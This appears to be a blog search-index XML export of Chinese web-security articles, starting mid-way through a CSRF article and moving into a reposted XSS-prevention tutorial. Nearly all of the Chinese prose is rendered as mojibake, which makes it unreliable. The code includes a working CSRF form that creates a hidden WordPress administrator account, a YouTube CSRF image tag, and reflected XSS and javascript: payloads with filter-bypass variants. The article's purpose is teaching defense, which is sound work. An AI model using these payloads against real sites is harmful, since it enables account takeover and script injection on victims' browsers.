Administrator&lt;/H2&gt; &lt;form method="POST" name="form0" action="http://&lt;wordpress_ip&gt;:80/wp-admin/user-new.php"&gt; &lt;input type="hidden" name="action" value="createuser"/&gt; &lt;input type="hidden" name="_wpnonce_create-user" value="&lt;sniffed_value&gt;"/&gt; &lt;input type="hidden" name="_wp_http_referer" value="%2Fwordpress%2Fwp-admin%2Fuser-new.php"/&gt; &lt;input type="hidden" name="user_login" value="admin2"/&gt; &lt;input type="hidden" name="email" value="admin2@admin.com"/&gt; &lt;input type="hidden" name="first_name" value="admin2@admin.com"/&gt; &lt;input type="hidden" name="last_name" value=""/&gt; &lt;input type="hidden" name="url" value=""/&gt; &lt;input type="hidden" name="pass1" value="password"/&gt; &lt;input type="hidden" name="pass2" value="password"/&gt; &lt;input type="hidden" name="role" value="administrator"/&gt; &lt;input type="hidden" name="createuser" value="Add+New+User+"/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; YouTubeçš„CSRFæ¼æ´2008å¹´ï¼Œæœ‰å®‰å…¨ç ”ç©¶äººå‘˜å‘ç°ï¼ŒYouTubeä¸Šå‡ ä¹æ‰€æœ‰ç”¨æˆ·å¯ä»¥æ“ä½œçš„åŠ¨ä½œéƒ½å­˜åœ¨CSRFæ¼æ´ã€‚å¦‚æœæ”»å‡»è€…å·²ç»å°†è§†é¢‘æ·»åŠ åˆ°ç”¨æˆ·çš„â€œFavoritesâ€ï¼Œé‚£ä¹ˆä»–å°±èƒ½å°†ä»–è‡ªå·±æ·»åŠ åˆ°ç”¨æˆ·çš„â€œFriendâ€æˆ–è€…â€œFamilyâ€åˆ—è¡¨ï¼Œä»¥ç”¨æˆ·çš„èº«ä»½å‘é€ä»»æ„çš„æ¶ˆæ¯ï¼Œå°†è§†é¢‘æ ‡è®°ä¸ºä¸å®œçš„ï¼Œè‡ªåŠ¨é€šè¿‡ç”¨æˆ·çš„è”ç³»äººæ¥å…±äº«ä¸€ä¸ªè§†é¢‘ã€‚ä¾‹å¦‚ï¼Œè¦æŠŠè§†é¢‘æ·»åŠ åˆ°ç”¨æˆ·çš„â€œFavoritesâ€ï¼Œæ”»å‡»è€…åªéœ€åœ¨ä»»ä½•ç«™ç‚¹ä¸ŠåµŒå…¥å¦‚ä¸‹æ‰€ç¤ºçš„IMGæ ‡ç­¾ï¼š 12&lt;img src="http://youtube.com/watch_ajax?action_add_favorite_playlist=1&amp;video_id=[VIDEO ID]&amp;playlist_id=&amp;add_to_favorite=1&amp;show=1&amp;button=AddvideoasFavorite"/&gt; æ”»å‡»è€…ä¹Ÿè®¸å·²ç»åˆ©ç”¨äº†è¯¥æ¼æ´æ¥æé«˜è§†é¢‘çš„æµè¡Œåº¦ã€‚ä¾‹å¦‚ï¼Œå°†ä¸€ä¸ªè§†é¢‘æ·»åŠ åˆ°è¶³å¤Ÿå¤šç”¨æˆ·çš„â€œFavoritesâ€ï¼ŒYouTubeå°±ä¼šæŠŠè¯¥è§†é¢‘ä½œä¸ºâ€œTop Favoritesâ€æ¥æ˜¾ç¤ºã€‚é™¤æé«˜ä¸€ä¸ªè§†é¢‘çš„æµè¡Œåº¦ä¹‹å¤–ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥å¯¼è‡´ç”¨æˆ·åœ¨æ¯«ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å°†ä¸€ä¸ªè§†é¢‘æ ‡è®°ä¸ºâ€œä¸å®œçš„â€ï¼Œä»è€Œå¯¼è‡´YouTubeåˆ é™¤è¯¥è§†é¢‘ã€‚ è¿™äº›æ”»å‡»è¿˜å¯èƒ½å·²è¢«ç”¨äºä¾µçŠ¯ç”¨æˆ·éšç§ã€‚YouTubeå…è®¸ç”¨æˆ·åªè®©æœ‹å‹æˆ–äº²å±è§‚çœ‹æŸäº›è§†é¢‘ã€‚è¿™äº›æ”»å‡»ä¼šå¯¼è‡´æ”»å‡»è€…å°†å…¶æ·»åŠ ä¸ºä¸€ä¸ªç”¨æˆ·çš„â€œFriendâ€æˆ–â€œFamilyâ€åˆ—è¡¨ï¼Œè¿™æ ·ä»–ä»¬å°±èƒ½å¤Ÿè®¿é—®æ‰€æœ‰åŸæœ¬åªé™äºå¥½å‹å’Œäº²å±è¡¨ä¸­çš„ç”¨æˆ·è§‚çœ‹çš„ç§äººçš„è§†é¢‘ã€‚ æ”»å‡»è€…è¿˜å¯ä»¥é€šè¿‡ç”¨æˆ·çš„æ‰€æœ‰è”ç³»äººåå•ï¼ˆâ€œFriendsâ€ã€â€œFamilyâ€ç­‰ç­‰ï¼‰æ¥å…±äº«ä¸€ä¸ªè§†é¢‘ï¼Œâ€œå…±äº«â€å°±æ„å‘³ç€å‘é€ä¸€ä¸ªè§†é¢‘çš„é“¾æ¥ç»™ä»–ä»¬ï¼Œå½“ç„¶è¿˜å¯ä»¥é€‰æ‹©é™„åŠ æ¶ˆæ¯ã€‚è¿™æ¡æ¶ˆæ¯ä¸­çš„é“¾æ¥å·²ç»å¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„è§†é¢‘é“¾æ¥ï¼Œè€Œæ˜¯ä¸€ä¸ªå…·æœ‰æ”»å‡»æ€§çš„ç½‘ç«™é“¾æ¥ï¼Œç”¨æˆ·å¾ˆæœ‰å¯èƒ½ä¼šç‚¹å‡»è¿™ä¸ªé“¾æ¥ï¼Œè¿™ä¾¿ä½¿å¾—è¯¥ç§æ”»å‡»èƒ½å¤Ÿè¿›è¡Œç—…æ¯’å¼çš„ä¼ æ’­ã€‚ å‚è€ƒæ–‡çŒ® Mozilla wiki.Security-Origin OWASP.Cross-Site_RequestForgery(CSRF)_Prevention_Cheat_Sheet. Gmail Security Hijack Case.Google-Gmail-Security-Hijack. Netsparker Blog.Same-Site-Cookie-Attribute-Prevent-Cross-site-Request-Forgery MDN.Same-origin_policy#IE_Exceptions]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯å®‰å…¨ç³»åˆ—ï¼ˆä¸€ï¼‰ï¼šå¦‚ä½•é˜²æ­¢XSSæ”»å‡»ï¼Ÿ]]></title>
    <url>%2F2019%2F09%2F08%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2XSS%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç¾å›¢æŠ€æœ¯å›¢é˜Ÿï¼Œä½œè€…æé˜³ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://tech.meituan.com/2018/09/27/fe-security.html å‰ç«¯å®‰å…¨éšç€äº’è”ç½‘çš„é«˜é€Ÿå‘å±•ï¼Œä¿¡æ¯å®‰å…¨é—®é¢˜å·²ç»æˆä¸ºä¼ä¸šæœ€ä¸ºå…³æ³¨çš„ç„¦ç‚¹ä¹‹ä¸€ï¼Œè€Œå‰ç«¯åˆæ˜¯å¼•å‘ä¼ä¸šå®‰å…¨é—®é¢˜çš„é«˜å±æ®ç‚¹ã€‚åœ¨ç§»åŠ¨äº’è”ç½‘æ—¶ä»£ï¼Œå‰ç«¯äººå‘˜é™¤äº†ä¼ ç»Ÿçš„ XSSã€CSRF ç­‰å®‰å…¨é—®é¢˜ä¹‹å¤–ï¼Œåˆæ—¶å¸¸é­é‡ç½‘ç»œåŠ«æŒã€éæ³•è°ƒç”¨ Hybrid API ç­‰æ–°å‹å®‰å…¨é—®é¢˜ã€‚å½“ç„¶ï¼Œæµè§ˆå™¨è‡ªèº«ä¹Ÿåœ¨ä¸æ–­åœ¨è¿›åŒ–å’Œå‘å±•ï¼Œä¸æ–­å¼•å…¥ CSPã€Same-Site Cookies ç­‰æ–°æŠ€æœ¯æ¥å¢å¼ºå®‰å…¨æ€§ï¼Œä½†æ˜¯ä»å­˜åœ¨å¾ˆå¤šæ½œåœ¨çš„å¨èƒï¼Œè¿™éœ€è¦å‰ç«¯æŠ€æœ¯äººå‘˜ä¸æ–­è¿›è¡Œâ€œæŸ¥æ¼è¡¥ç¼ºâ€ã€‚ è¿‘å‡ å¹´ï¼Œç¾å›¢ä¸šåŠ¡é«˜é€Ÿå‘å±•ï¼Œå‰ç«¯éšä¹‹é¢ä¸´å¾ˆå¤šå®‰å…¨æŒ‘æˆ˜ï¼Œå› æ­¤ç§¯ç´¯äº†å¤§é‡çš„å®è·µç»éªŒã€‚æˆ‘ä»¬æ¢³ç†äº†å¸¸è§çš„å‰ç«¯å®‰å…¨é—®é¢˜ä»¥åŠå¯¹åº”çš„è§£å†³æ–¹æ¡ˆï¼Œå°†ä¼šåšæˆä¸€ä¸ªç³»åˆ—ï¼Œå¸Œæœ›å¯ä»¥å¸®åŠ©å‰ç«¯äººå‘˜åœ¨æ—¥å¸¸å¼€å‘ä¸­ä¸æ–­é¢„é˜²å’Œä¿®å¤å®‰å…¨æ¼æ´ã€‚æœ¬æ–‡æ˜¯è¯¥ç³»åˆ—çš„ç¬¬ä¸€ç¯‡ã€‚ æœ¬æ–‡æˆ‘ä»¬ä¼šè®²è§£ XSS ï¼Œä¸»è¦åŒ…æ‹¬ï¼š XSS æ”»å‡»çš„ä»‹ç» XSS æ”»å‡»çš„åˆ†ç±» XSS æ”»å‡»çš„é¢„é˜²å’Œæ£€æµ‹ XSS æ”»å‡»çš„æ€»ç»“ XSS æ”»å‡»æ¡ˆä¾‹ XSS æ”»å‡»çš„ä»‹ç»åœ¨å¼€å§‹æœ¬æ–‡ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæå‡ºä¸€ä¸ªé—®é¢˜ï¼Œè¯·åˆ¤æ–­ä»¥ä¸‹ä¸¤ä¸ªè¯´æ³•æ˜¯å¦æ­£ç¡®ï¼š XSS é˜²èŒƒæ˜¯åç«¯ RDï¼ˆç ”å‘äººå‘˜ï¼‰çš„è´£ä»»ï¼Œåç«¯ RD åº”è¯¥åœ¨æ‰€æœ‰ç”¨æˆ·æäº¤æ•°æ®çš„æ¥å£ï¼Œå¯¹æ•æ„Ÿå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œæ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚ æ‰€æœ‰è¦æ’å…¥åˆ°é¡µé¢ä¸Šçš„æ•°æ®ï¼Œéƒ½è¦é€šè¿‡ä¸€ä¸ªæ•æ„Ÿå­—ç¬¦è¿‡æ»¤å‡½æ•°çš„è½¬ä¹‰ï¼Œè¿‡æ»¤æ‰é€šç”¨çš„æ•æ„Ÿå­—ç¬¦åï¼Œå°±å¯ä»¥æ’å…¥åˆ°é¡µé¢ä¸­ã€‚ å¦‚æœä½ è¿˜ä¸èƒ½ç¡®å®šç­”æ¡ˆï¼Œé‚£ä¹ˆå¯ä»¥å¸¦ç€è¿™äº›é—®é¢˜å‘ä¸‹çœ‹ï¼Œæˆ‘ä»¬å°†é€æ­¥æ‹†è§£é—®é¢˜ã€‚ XSS æ¼æ´çš„å‘ç”Ÿå’Œä¿®å¤XSS æ”»å‡»æ˜¯é¡µé¢è¢«æ³¨å…¥äº†æ¶æ„çš„ä»£ç ï¼Œä¸ºäº†æ›´å½¢è±¡çš„ä»‹ç»ï¼Œæˆ‘ä»¬ç”¨å‘ç”Ÿåœ¨å°æ˜åŒå­¦èº«è¾¹çš„äº‹ä¾‹æ¥è¿›è¡Œè¯´æ˜ã€‚ ä¸€ä¸ªæ¡ˆä¾‹æŸå¤©ï¼Œå…¬å¸éœ€è¦ä¸€ä¸ªæœç´¢é¡µé¢ï¼Œæ ¹æ® URL å‚æ•°å†³å®šå…³é”®è¯çš„å†…å®¹ã€‚å°æ˜å¾ˆå¿«æŠŠé¡µé¢å†™å¥½å¹¶ä¸”ä¸Šçº¿ã€‚ä»£ç å¦‚ä¸‹ï¼š 12345&lt;input type="text" value="&lt;%= getParameter("keyword") %&gt;"&gt;&lt;button&gt;æœç´¢&lt;/button&gt;&lt;div&gt; æ‚¨æœç´¢çš„å…³é”®è¯æ˜¯ï¼š&lt;%= getParameter("keyword") %&gt;&lt;/div&gt; ç„¶è€Œï¼Œåœ¨ä¸Šçº¿åä¸ä¹…ï¼Œå°æ˜å°±æ¥åˆ°äº†å®‰å…¨ç»„å‘æ¥çš„ä¸€ä¸ªç¥ç§˜é“¾æ¥ï¼š 1http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;);&lt;/script&gt; å°æ˜å¸¦ç€ä¸€ç§ä¸ç¥¥çš„é¢„æ„Ÿç‚¹å¼€äº†è¿™ä¸ªé“¾æ¥[è¯·å‹¿æ¨¡ä»¿ï¼Œç¡®è®¤å®‰å…¨çš„é“¾æ¥æ‰èƒ½ç‚¹å¼€]ã€‚æœç„¶ï¼Œé¡µé¢ä¸­å¼¹å‡ºäº†å†™ç€â€XSSâ€çš„å¯¹è¯æ¡†ã€‚ å¯æ¶ï¼Œä¸­æ‹›äº†ï¼å°æ˜çœ‰å¤´ä¸€çš±ï¼Œå‘ç°äº†å…¶ä¸­çš„å¥¥ç§˜ï¼š å½“æµè§ˆå™¨è¯·æ±‚ http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt; æ—¶ï¼ŒæœåŠ¡ç«¯ä¼šè§£æå‡ºè¯·æ±‚å‚æ•° keywordï¼Œå¾—åˆ° &quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;ï¼Œæ‹¼æ¥åˆ° HTML ä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚å½¢æˆäº†å¦‚ä¸‹çš„ HTMLï¼š 123456789&lt;input type="text" value="" /&gt;&lt;script&gt; alert('XSS');&lt;/script&gt;"&gt;&lt;button&gt;æœç´¢&lt;/button&gt;&lt;div&gt; æ‚¨æœç´¢çš„å…³é”®è¯æ˜¯ï¼š"&gt;&lt;script&gt; alert('XSS'); &lt;/script&gt;&lt;/div&gt; æµè§ˆå™¨æ— æ³•åˆ†è¾¨å‡º &lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt; æ˜¯æ¶æ„ä»£ç ï¼Œå› è€Œå°†å…¶æ‰§è¡Œã€‚ è¿™é‡Œä¸ä»…ä»… div çš„å†…å®¹è¢«æ³¨å…¥äº†ï¼Œè€Œä¸” input çš„ value å±æ€§ä¹Ÿè¢«æ³¨å…¥ï¼Œ alert ä¼šå¼¹å‡ºä¸¤æ¬¡ã€‚ é¢å¯¹è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•è¿›è¡Œé˜²èŒƒå‘¢ï¼Ÿ å…¶å®ï¼Œè¿™åªæ˜¯æµè§ˆå™¨æŠŠç”¨æˆ·çš„è¾“å…¥å½“æˆäº†è„šæœ¬è¿›è¡Œäº†æ‰§è¡Œã€‚é‚£ä¹ˆåªè¦å‘Šè¯‰æµè§ˆå™¨è¿™æ®µå†…å®¹æ˜¯æ–‡æœ¬å°±å¯ä»¥äº†ã€‚ èªæ˜çš„å°æ˜å¾ˆå¿«æ‰¾åˆ°è§£å†³æ–¹æ³•ï¼ŒæŠŠè¿™ä¸ªæ¼æ´ä¿®å¤ï¼š 12345&lt;input type="text" value="&lt;%= escapeHTML(getParameter("keyword")) %&gt;"&gt;&lt;button&gt;æœç´¢&lt;/button&gt;&lt;div&gt; æ‚¨æœç´¢çš„å…³é”®è¯æ˜¯ï¼š&lt;%= escapeHTML(getParameter("keyword")) %&gt;&lt;/div&gt; escapeHTML() æŒ‰ç…§å¦‚ä¸‹è§„åˆ™è¿›è¡Œè½¬ä¹‰ï¼š |å­—ç¬¦|è½¬ä¹‰åçš„å­—ç¬¦| |-|-| |&amp;|&amp;amp;| |&lt;|&amp;lt;| |&gt;|&amp;gt;| |&quot;|&amp;quot;| |&#39;|&amp;#x27;| |/|&amp;#x2F;| ç»è¿‡äº†è½¬ä¹‰å‡½æ•°çš„å¤„ç†åï¼Œæœ€ç»ˆæµè§ˆå™¨æ¥æ”¶åˆ°çš„å“åº”ä¸ºï¼š 12345678&lt;input type="text" value='"&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;'/&gt;&lt;button&gt;æœç´¢&lt;/button&gt;&lt;div&gt; æ‚¨æœç´¢çš„å…³é”®è¯æ˜¯ï¼š&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;&lt;/div&gt; æ¶æ„ä»£ç éƒ½è¢«è½¬ä¹‰ï¼Œä¸å†è¢«æµè§ˆå™¨æ‰§è¡Œï¼Œè€Œä¸”æœç´¢è¯èƒ½å¤Ÿå®Œç¾çš„åœ¨é¡µé¢æ˜¾ç¤ºå‡ºæ¥ã€‚ é€šè¿‡è¿™ä¸ªäº‹ä»¶ï¼Œå°æ˜å­¦ä¹ åˆ°äº†å¦‚ä¸‹çŸ¥è¯†ï¼š é€šå¸¸é¡µé¢ä¸­åŒ…å«çš„ç”¨æˆ·è¾“å…¥å†…å®¹éƒ½åœ¨å›ºå®šçš„å®¹å™¨æˆ–è€…å±æ€§å†…ï¼Œä»¥æ–‡æœ¬çš„å½¢å¼å±•ç¤ºã€‚ æ”»å‡»è€…åˆ©ç”¨è¿™äº›é¡µé¢çš„ç”¨æˆ·è¾“å…¥ç‰‡æ®µï¼Œæ‹¼æ¥ç‰¹æ®Šæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œçªç ´åŸæœ‰ä½ç½®çš„é™åˆ¶ï¼Œå½¢æˆäº†ä»£ç ç‰‡æ®µã€‚ æ”»å‡»è€…é€šè¿‡åœ¨ç›®æ ‡ç½‘ç«™ä¸Šæ³¨å…¥è„šæœ¬ï¼Œä½¿ä¹‹åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šè¿è¡Œï¼Œä»è€Œå¼•å‘æ½œåœ¨é£é™©ã€‚ é€šè¿‡ HTML è½¬ä¹‰ï¼Œå¯ä»¥é˜²æ­¢ XSS æ”»å‡»ã€‚[äº‹æƒ…å½“ç„¶æ²¡æœ‰è¿™ä¹ˆç®€å•å•¦ï¼è¯·ç»§ç»­å¾€ä¸‹çœ‹]ã€‚ æ³¨æ„ç‰¹æ®Šçš„ HTML å±æ€§ã€JavaScript APIè‡ªä»ä¸Šæ¬¡äº‹ä»¶ä¹‹åï¼Œå°æ˜ä¼šå°å¿ƒçš„æŠŠæ’å…¥åˆ°é¡µé¢ä¸­çš„æ•°æ®è¿›è¡Œè½¬ä¹‰ã€‚è€Œä¸”ä»–è¿˜å‘ç°äº†å¤§éƒ¨åˆ†æ¨¡æ¿éƒ½å¸¦æœ‰çš„è½¬ä¹‰é…ç½®ï¼Œè®©æ‰€æœ‰æ’å…¥åˆ°é¡µé¢ä¸­çš„æ•°æ®éƒ½é»˜è®¤è¿›è¡Œè½¬ä¹‰ã€‚è¿™æ ·å°±ä¸æ€•ä¸å°å¿ƒæ¼æ‰æœªè½¬ä¹‰çš„å˜é‡å•¦ï¼Œäºæ˜¯å°æ˜çš„å·¥ä½œåˆæ¸æ¸å˜å¾—è½»æ¾èµ·æ¥ã€‚ ä½†æ˜¯ï¼Œä½œä¸ºå¯¼æ¼”çš„æˆ‘ï¼Œä¸å¯èƒ½è®©å°æ˜è¿™ä¹ˆç®€å•ã€å¼€å¿ƒåœ°æ”¹ Bug ã€‚ ä¸ä¹…ï¼Œå°æ˜åˆæ”¶åˆ°å®‰å…¨ç»„çš„ç¥ç§˜é“¾æ¥ï¼šhttp://xxx/?redirect_to=javascript:alert(&#39;XSS&#39;)ã€‚å°æ˜ä¸æ•¢å¤§æ„ï¼Œèµ¶å¿™ç‚¹å¼€é¡µé¢ã€‚ç„¶è€Œï¼Œé¡µé¢å¹¶æ²¡æœ‰è‡ªåŠ¨å¼¹å‡ºä¸‡æ¶çš„â€œXSSâ€ã€‚ å°æ˜æ‰“å¼€å¯¹åº”é¡µé¢çš„æºç ï¼Œå‘ç°æœ‰ä»¥ä¸‹å†…å®¹ï¼š 1&lt;a href="&lt;%= escapeHTML(getParameter("redirect_to")) %&gt;"&gt;è·³è½¬...&lt;/a&gt; è¿™æ®µä»£ç ï¼Œå½“æ”»å‡» URL ä¸º http://xxx/?redirect_to=javascript:alert(&#39;XSS&#39;)ï¼ŒæœåŠ¡ç«¯å“åº”å°±æˆäº†ï¼š 1&lt;a href="javascript:alert(&amp;#x27;XSS&amp;#x27;)"&gt;è·³è½¬...&lt;/a&gt; è™½ç„¶ä»£ç ä¸ä¼šç«‹å³æ‰§è¡Œï¼Œä½†ä¸€æ—¦ç”¨æˆ·ç‚¹å‡» a æ ‡ç­¾æ—¶ï¼Œæµè§ˆå™¨ä¼šå°±ä¼šå¼¹å‡ºâ€œXSSâ€ã€‚ å¯æ¶ï¼Œåˆå¤±ç­–äº†â€¦ åœ¨è¿™é‡Œï¼Œç”¨æˆ·çš„æ•°æ®å¹¶æ²¡æœ‰åœ¨ä½ç½®ä¸Šçªç ´æˆ‘ä»¬çš„é™åˆ¶ï¼Œä»ç„¶æ˜¯æ­£ç¡®çš„ href å±æ€§ã€‚ä½†å…¶å†…å®¹å¹¶ä¸æ˜¯æˆ‘ä»¬æ‰€é¢„æœŸçš„ç±»å‹ã€‚ åŸæ¥ä¸ä»…ä»…æ˜¯ç‰¹æ®Šå­—ç¬¦ï¼Œè¿ javascript: è¿™æ ·çš„å­—ç¬¦ä¸²å¦‚æœå‡ºç°åœ¨ç‰¹å®šçš„ä½ç½®ä¹Ÿä¼šå¼•å‘ XSS æ”»å‡»ã€‚ å°æ˜çœ‰å¤´ä¸€çš±ï¼Œæƒ³åˆ°äº†è§£å†³åŠæ³•ï¼š 1234567891011// ç¦æ­¢ URL ä»¥ "javascript:" å¼€å¤´xss = getParameter("redirect_to").startsWith('javascript:');if (!xss) &#123; &lt;a href="&lt;%= escapeHTML(getParameter("redirect_to"))%&gt;"&gt; è·³è½¬... &lt;/a&gt;&#125; else &#123; &lt;a href="/404"&gt; è·³è½¬... &lt;/a&gt;&#125; åªè¦ URL çš„å¼€å¤´ä¸æ˜¯ javascript:ï¼Œå°±å®‰å…¨äº†å§ï¼Ÿ å®‰å…¨ç»„éšæ‰‹åˆæ‰”äº†ä¸€ä¸ªè¿æ¥ï¼šhttp://xxx/?redirect_to=jAvascRipt:alert(&#39;XSS&#39;) è¿™ä¹Ÿèƒ½æ‰§è¡Œï¼Ÿâ€¦..å¥½å§ï¼Œæµè§ˆå™¨å°±æ˜¯è¿™ä¹ˆå¼ºå¤§ã€‚ å°æ˜æ¬²å“­æ— æ³ªï¼Œåœ¨åˆ¤æ–­ URL å¼€å¤´æ˜¯å¦ä¸º javascript: æ—¶ï¼Œå…ˆæŠŠç”¨æˆ·è¾“å…¥è½¬æˆäº†å°å†™ï¼Œç„¶åå†è¿›è¡Œæ¯”å¯¹ã€‚ ä¸è¿‡ï¼Œæ‰€è°“â€œé“é«˜ä¸€å°ºï¼Œé­”é«˜ä¸€ä¸ˆâ€ã€‚é¢å¯¹å°æ˜çš„é˜²æŠ¤ç­–ç•¥ï¼Œå®‰å…¨ç»„å°±æ„é€ äº†è¿™æ ·ä¸€ä¸ªè¿æ¥ï¼š 1http://xxx/?redirect_to=%20javascript:alert(&apos;XSS&apos;) %20javascript:alert(&#39;XSS&#39;) ç»è¿‡ URL è§£æåå˜æˆ javascript:alert(&#39;XSS&#39;)ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²ä»¥ç©ºæ ¼å¼€å¤´ã€‚è¿™æ ·æ”»å‡»è€…å¯ä»¥ç»•è¿‡åç«¯çš„å…³é”®è¯è§„åˆ™ï¼ŒåˆæˆåŠŸçš„å®Œæˆäº†æ³¨å…¥ã€‚ æœ€ç»ˆï¼Œå°æ˜é€‰æ‹©äº†ç™½åå•çš„æ–¹æ³•ï¼Œå½»åº•è§£å†³äº†è¿™ä¸ªæ¼æ´ï¼š 1234567891011121314// æ ¹æ®é¡¹ç›®æƒ…å†µè¿›è¡Œè¿‡æ»¤ï¼Œç¦æ­¢æ‰ "javascript:" é“¾æ¥ã€éæ³• scheme ç­‰allowSchemes = ["http", "https"];valid = isValid(getParameter("redirect_to"), allowSchemes);if (valid) &#123; &lt;a href="&lt;%= escapeHTML(getParameter("redirect_to"))%&gt;"&gt; è·³è½¬... &lt;/a&gt;&#125; else &#123; &lt;a href="/404"&gt; è·³è½¬... &lt;/a&gt;&#125; é€šè¿‡è¿™ä¸ªäº‹ä»¶ï¼Œå°æ˜å­¦ä¹ åˆ°äº†å¦‚ä¸‹çŸ¥è¯†ï¼š åšäº† HTML è½¬ä¹‰ï¼Œå¹¶ä¸ç­‰äºé«˜æ•æ— å¿§ã€‚ å¯¹äºé“¾æ¥è·³è½¬ï¼Œå¦‚ &lt;a href=&quot;xxx&quot; æˆ– location.href=&quot;xxx&quot;ï¼Œè¦æ£€éªŒå…¶å†…å®¹ï¼Œç¦æ­¢ä»¥ javascript: å¼€å¤´çš„é“¾æ¥ï¼Œå’Œå…¶ä»–éæ³•çš„ schemeã€‚ æ ¹æ®ä¸Šä¸‹æ–‡é‡‡ç”¨ä¸åŒçš„è½¬ä¹‰è§„åˆ™æŸå¤©ï¼Œå°æ˜ä¸ºäº†åŠ å¿«ç½‘é¡µçš„åŠ è½½é€Ÿåº¦ï¼ŒæŠŠä¸€ä¸ªæ•°æ®é€šè¿‡ JSON çš„æ–¹å¼å†…è”åˆ° HTML ä¸­ï¼š 123&lt;script&gt; var initData = &lt;%= data.toJSON() %&gt;&lt;/script&gt; æ’å…¥ JSON çš„åœ°æ–¹ä¸èƒ½ä½¿ç”¨ escapeHTML()ï¼Œå› ä¸ºè½¬ä¹‰ &quot; åï¼ŒJSON æ ¼å¼ä¼šè¢«ç ´åã€‚ ä½†å®‰å…¨ç»„åˆå‘ç°æœ‰æ¼æ´ï¼ŒåŸæ¥è¿™æ ·å†…è” JSON ä¹Ÿæ˜¯ä¸å®‰å…¨çš„ï¼š å½“ JSON ä¸­åŒ…å« U+2028 æˆ– U+2029 è¿™ä¸¤ä¸ªå­—ç¬¦æ—¶ï¼Œä¸èƒ½ä½œä¸º JavaScript çš„å­—é¢é‡ä½¿ç”¨ï¼Œå¦åˆ™ä¼šæŠ›å‡ºè¯­æ³•é”™è¯¯ã€‚ å½“ JSON ä¸­åŒ…å«å­—ç¬¦ä¸² &lt;/script&gt; æ—¶ï¼Œå½“å‰çš„ script æ ‡ç­¾å°†ä¼šè¢«é—­åˆï¼Œåé¢çš„å­—ç¬¦ä¸²å†…å®¹æµè§ˆå™¨ä¼šæŒ‰ç…§ HTML è¿›è¡Œè§£æï¼›é€šè¿‡å¢åŠ ä¸‹ä¸€ä¸ª &lt;script&gt; æ ‡ç­¾ç­‰æ–¹æ³•å°±å¯ä»¥å®Œæˆæ³¨å…¥ã€‚ äºæ˜¯æˆ‘ä»¬åˆè¦å®ç°ä¸€ä¸ª escapeEmbedJSON() å‡½æ•°ï¼Œå¯¹å†…è” JSON è¿›è¡Œè½¬ä¹‰ã€‚ è½¬ä¹‰è§„åˆ™å¦‚ä¸‹ï¼š |å­—ç¬¦|è½¬ä¹‰åçš„å­—ç¬¦| |-|-| |U+2028|\u2028| |U+2029|\u2029| |&lt;|\u003c| ä¿®å¤åçš„ä»£ç å¦‚ä¸‹ï¼š 12&lt;script&gt;var initData = &lt;%= escapeEmbedJSON(data.toJSON()) %&gt; é€šè¿‡è¿™ä¸ªäº‹ä»¶ï¼Œå°æ˜å­¦ä¹ åˆ°äº†å¦‚ä¸‹çŸ¥è¯†ï¼š HTML è½¬ä¹‰æ˜¯éå¸¸å¤æ‚çš„ï¼Œåœ¨ä¸åŒçš„æƒ…å†µä¸‹è¦é‡‡ç”¨ä¸åŒçš„è½¬ä¹‰è§„åˆ™ã€‚å¦‚æœé‡‡ç”¨äº†é”™è¯¯çš„è½¬ä¹‰è§„åˆ™ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šåŸ‹ä¸‹ XSS éšæ‚£ã€‚ åº”å½“å°½é‡é¿å…è‡ªå·±å†™è½¬ä¹‰åº“ï¼Œè€Œåº”å½“é‡‡ç”¨æˆç†Ÿçš„ã€ä¸šç•Œé€šç”¨çš„è½¬ä¹‰åº“ã€‚ æ¼æ´æ€»ç»“å°æ˜çš„ä¾‹å­è®²å®Œäº†ï¼Œä¸‹é¢æˆ‘ä»¬æ¥ç³»ç»Ÿçš„çœ‹ä¸‹ XSS æœ‰å“ªäº›æ³¨å…¥çš„æ–¹æ³•ï¼š åœ¨ HTML ä¸­å†…åµŒçš„æ–‡æœ¬ä¸­ï¼Œæ¶æ„å†…å®¹ä»¥ script æ ‡ç­¾å½¢æˆæ³¨å…¥ã€‚ åœ¨å†…è”çš„ JavaScript ä¸­ï¼Œæ‹¼æ¥çš„æ•°æ®çªç ´äº†åŸæœ¬çš„é™åˆ¶ï¼ˆå­—ç¬¦ä¸²ï¼Œå˜é‡ï¼Œæ–¹æ³•åç­‰ï¼‰ã€‚ åœ¨æ ‡ç­¾å±æ€§ä¸­ï¼Œæ¶æ„å†…å®¹åŒ…å«å¼•å·ï¼Œä»è€Œçªç ´å±æ€§å€¼çš„é™åˆ¶ï¼Œæ³¨å…¥å…¶ä»–å±æ€§æˆ–è€…æ ‡ç­¾ã€‚ åœ¨æ ‡ç­¾çš„ hrefã€src ç­‰å±æ€§ä¸­ï¼ŒåŒ…å« javascript: 